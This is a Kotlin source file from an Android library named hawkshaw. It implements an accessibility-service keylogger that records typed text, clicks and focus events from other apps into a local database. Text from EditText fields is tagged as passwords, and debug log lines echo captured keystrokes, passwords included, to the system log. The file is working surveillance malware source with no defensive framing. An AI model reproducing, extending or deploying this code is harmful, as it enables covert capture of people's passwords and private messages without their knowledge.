package com.hawkshaw.library.features.accessibility

import android.accessibilityservice.AccessibilityService
import android.util.Log // Added for Android logging
import android.view.accessibility.AccessibilityEvent
import com.hawkshaw.library.datalayer.room.keylogger.KeyLogEntity
import com.hawkshaw.library.datalayer.room.AppDatabaseKt
import com.hawkshaw.library.logger.Logger

/**
 * Handles keylogging events from the accessibility service
 */
object KeyloggerEventKt {
    private const val TAG = "KeyloggerEventKt" // Existing TAG, will be used by android.util.Log
    private const val PASSWORD_FIELD_TYPE = "android.widget.EditText"

    /**
     * Process an accessibility event
     * @param service The accessibility service
     * @param event The accessibility event to process
     */
    suspend fun processEvent(service: AccessibilityService, event: AccessibilityEvent) {
        Log.d(TAG, "[DEBUG] processEvent called. Event: type=${event.eventType}, pkg=${event.packageName}, class=${event.className}, text='${event.text?.joinToString(" ")}'")
        try {
            // Get the package name from the event
            val packageName = event.packageName?.toString()
            if (packageName == null) {
                Log.d(TAG, "[DEBUG] processEvent: Package name is null. Returning.")
                return
            }
            Log.d(TAG, "[DEBUG] processEvent: packageName='$packageName'")
            
            // Get the text from the event, defaulting to empty string if null
            // This text will be used for the 'message' parameter of KeyloggerEntity
            val eventText = event.text.joinToString(" ")
            Log.d(TAG, "[DEBUG] processEvent: eventText='$eventText'")

            // Check if this is a password field
            if (event.className?.toString() == PASSWORD_FIELD_TYPE && 
                event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                Log.d(TAG, "[DEBUG] processEvent: Password field detected. ClassName='${event.className}', EventType=${event.eventType}")
                // Create and insert the password keylog entity
                val entity = KeyLogEntity(
                    type = KeyLogEntity.Type.Password,
                    packageName = packageName,
                    message = eventText // FIX: Pass 'eventText' to the 'message' parameter
                )
                Log.d(TAG, "[DEBUG] processEvent: Creating Password KeyLogEntity: $entity")
                insertKeyloggerEntity(entity)
                return
            }
            
            val mappedType = type(event.eventType)
            // Create and insert the regular keylog entity
            val entity = KeyLogEntity(
                type = mappedType,
                packageName = packageName,
                message = eventText // FIX: Pass 'eventText' to the 'message' parameter
            )
            Log.d(TAG, "[DEBUG] processEvent: Creating Regular KeyLogEntity: $entity")
            insertKeyloggerEntity(entity)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in processEvent: ${e.message}", e) // Also log to android.util.Log for consistency
            Logger.e(TAG, "Error processing accessibility event", e, false, 12, null)
        }
    }

    /**
     * Maps accessibility event types to KeyloggerEntity types
     */
    private fun type(eventType: Int): KeyLogEntity.Type {
        Log.d(TAG, "[DEBUG] type() called with eventType: $eventType")
        val keyLogType = when (eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> KeyLogEntity.Type.ViewClicked
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> KeyLogEntity.Type.ViewFocused
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> KeyLogEntity.Type.TextChanged
            else -> KeyLogEntity.Type.Unknown
        }
        Log.d(TAG, "[DEBUG] type() mapped eventType $eventType to KeyLogEntity.Type: $keyLogType")
        return keyLogType
    }

    /**
     * Insert a KeyloggerEntity into the database
     */
    private suspend fun insertKeyloggerEntity(entity: KeyLogEntity) {
        Log.d(TAG, "[DEBUG] insertKeyloggerEntity called with entity: $entity")
        try {
            AppDatabaseKt.db.keyloggerDao().insert(entity)
            // Logger.d is already good for success indication
            Logger.d(TAG, "Inserted keylog entity: $entity", false, 4, null)
        } catch (e: Exception) {
            Log.e(TAG, "[DEBUG] Error in insertKeyloggerEntity: ${e.message}", e) // Also log to android.util.Log for consistency
            Logger.e(TAG, "Error inserting keylog entity", e, false, 12, null)
        }
    }
}
